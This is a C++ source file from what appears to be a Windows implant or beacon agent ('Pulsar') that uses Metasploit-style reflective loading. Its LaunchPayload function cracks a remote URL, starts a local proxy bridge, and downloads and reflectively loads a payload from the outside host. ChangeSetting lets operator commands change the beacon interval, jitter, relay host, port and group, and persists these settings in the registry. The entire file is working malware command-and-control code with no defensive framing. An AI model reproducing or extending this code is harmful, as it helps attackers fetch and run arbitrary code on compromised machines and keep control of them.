#include "PulsarInternal.h"
#include "PulsarLog.h"
#include "PulsarProxyLib.h"
#include "MetasploitLoader.h"
#include "LoadLibraryR.h"
#include "vars.h"
#include "Watcher.h"
#include "creds.h"
#include "jsmn.h"
#include "beacon.h"

#include <stdlib.h>
#include <time.h>
#include <EventSys.h>
#include <winhttp.h>
#include <Shlwapi.h>

//
// Retreive and reflectively load our payload.
// We tell the PulsarProxy to bridge to the "site"
// given
//
BOOL LaunchPayload(PCHAR site){
	DBGPrint("Called with: %s\n",site);

	PWCHAR payloadHost;
	USHORT payloadPort;
	PWCHAR payloadPath;


	//Slice up the arg into its pieces
	URL_COMPONENTS urlComp;
    DWORD dwUrlLen = 0;
	DWORD dwSize;

    // Initialize the URL_COMPONENTS structure.
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);

    // Set required component lengths to non-zero 
    // so that they are cracked.
    urlComp.dwSchemeLength    = (DWORD)-1;
    urlComp.dwHostNameLength  = (DWORD)-1;
    urlComp.dwUrlPathLength   = (DWORD)-1;
    urlComp.dwExtraInfoLength = (DWORD)-1;


	//Convert the URL to unicode
	  const WCHAR *pwcsPayloadURL;
	  int nChars = MultiByteToWideChar(CP_UTF8, 0,site , -1, NULL, 0);
	  pwcsPayloadURL = new WCHAR[nChars];
	  MultiByteToWideChar(CP_UTF8, 0, site, -1, (LPWSTR)pwcsPayloadURL, nChars);

	  DBGPrint("pwcsPayloadURL: %S\n",pwcsPayloadURL);

    // Crack the URL.
    if (!WinHttpCrackUrl( pwcsPayloadURL, (DWORD)wcslen(pwcsPayloadURL), 0, &urlComp))
    {
        DBGPrint("Error %u in WinHttpCrackUrl.\n", GetLastError());
		return FALSE;
    }
    else
    {
		DBGPrint("hostname: %d  %S\n",urlComp.dwHostNameLength,urlComp.lpszHostName);
		nChars = urlComp.dwHostNameLength;
		dwSize = (nChars + 1) * sizeof(WCHAR);
		payloadHost = (PWCHAR) HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwSize);
		wcsncpy(payloadHost,urlComp.lpszHostName,nChars);
		DBGPrint("payloadHost: %S\n",payloadHost);

		payloadPort = urlComp.nPort;
		DBGPrint("payloadPort: %d\n",payloadPort);

		nChars = urlComp.dwUrlPathLength;
		dwSize = (nChars + 1) * sizeof(WCHAR);
		payloadPath = (PWCHAR) HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwSize);
		wcsncpy(payloadPath,urlComp.lpszUrlPath,nChars);
		DBGPrint("payloadPath: %S\n",payloadPath);

    }

	if (urlComp.nScheme == INTERNET_SCHEME_HTTPS){
		DBGPrint("Proxy Bridge Using SSL\n");
		g_meterproxy_config.bMProxyFlags = WINHTTP_FLAG_REFRESH | WINHTTP_FLAG_SECURE;
	}
	else{
		DBGPrint("Proxy Bridge NOT using SSL\n");
		g_meterproxy_config.bMProxyFlags = WINHTTP_FLAG_REFRESH;
	}


	//Launch PulsarProxy
	HANDLE hProxy = InstallPulsarProxy(pulsar_context->pulsarproxy_port, payloadHost, payloadPath, payloadPort);

	//Now load the payload and let it go, we currently always connect to
	//localhost, unti we support he proxy on another host. We connect through
	//the proxy to grab our payload
    LoadHTTPPayload("127.0.0.1",pulsar_context->pulsarproxy_port);

	//LoadHTTPPayload blocks so when we're done we can close the proxy
	DWORD dwThreadID = GetThreadId(hProxy);
	PostThreadMessage(dwThreadID, WM_QUIT, 0, 0);


	delete [] pwcsPayloadURL;

	DBGPrint("Returning\n");
	return FALSE;



}

//
// Update a local setting
//
BOOL ChangeSetting(PCHAR arg){
	DBGPrint("Called with: %s\n",arg);

	DWORD dwTmp = 0;
	PCHAR ptr;


	//Determine which setting we change
	if(StrStrI(arg,"interval") ){
		DBGPrint("Updating Beacon Interval\n");
		//find the = 
		  ptr = StrChrI(arg,'=');
		  if(!ptr){
			  return FALSE;
		  }
		  ptr++;
		//Get the numeric value
		  dwTmp = strtol(ptr,NULL,10);
		  pulsar_context->dwBeaconTime = dwTmp;
		  DBGPrint("The new Beacon time is: %d\n",dwTmp);
	
	}

	if(StrStrI(arg,"jitter") ){
		DBGPrint("Updating Beacon Jitter\n");
		//find the = 
		  ptr = StrChrI(arg,'=');
		  if(!ptr){
			  return FALSE;
		  }
		  ptr++;
		//Get the numeric value
		  dwTmp = strtol(ptr,NULL,10);
		  pulsar_context->dwBeaconJitter = dwTmp;
		  DBGPrint("The new Jitter is: %d\n",dwTmp);

	}

	if(StrStrI(arg,"port")){
		DBGPrint("Updating Relay Port\n");
		//find the = 
		  ptr = StrChrI(arg,'=');
		  if(!ptr){
			  return FALSE;
		  }
		  ptr++;
		//Get the numeric value
		  dwTmp = strtol(ptr,NULL,10);
		  pulsar_context->pulsarproxy_port = dwTmp;
		  DBGPrint("The new Port is: %d\n",dwTmp);

	}

	if(StrStrI(arg,"host")){
		DBGPrint("Updating Relay Host\n");
		//find the = 
		  ptr = StrChrI(arg,'=');
		  if(!ptr){
			  return FALSE;
		  }
		  ptr++;
		  //Free the old host
		  HeapFree(GetProcessHeap(),0,pulsar_context->beacon_url);

		  //Allocate space for the new
		  dwTmp =strlen(ptr);
		  pulsar_context->beacon_url = (PCHAR) HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwTmp + 1);
		  if(pulsar_context->beacon_url == NULL){
			DBGPrint("Failed to allocate Beacon URL\n");
			return FALSE;
		  }
		  
		  //copy over
		  strcpy(pulsar_context->beacon_url,ptr);

		  //update the in-memory-copy
		  InitialzeBeaconResources();

	}

	if(StrStrI(arg,"group")){
		DBGPrint("Updating group\n");

		//find the = 
		  ptr = StrChrI(arg,'=');
		  if(!ptr){
			  return FALSE;
		  }
		  ptr++;
		  //Free the old host
		  HeapFree(GetProcessHeap(),0,pulsar_context->group);

		  //Allocate space for the new
		  dwTmp =strlen(ptr);
		  pulsar_context->group = (PCHAR) HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwTmp + 1);
		  if(pulsar_context->group == NULL){
			DBGPrint("Failed to allocate Beacon URL\n");
			return FALSE;
		  }
		  
		  //copy over
		  strcpy(pulsar_context->group,ptr);

	}

	//Now preserve all settings in the 
	//registry
	  WriteVarstoReg();


	DBGPrint("Returning\n");
	return TRUE;
}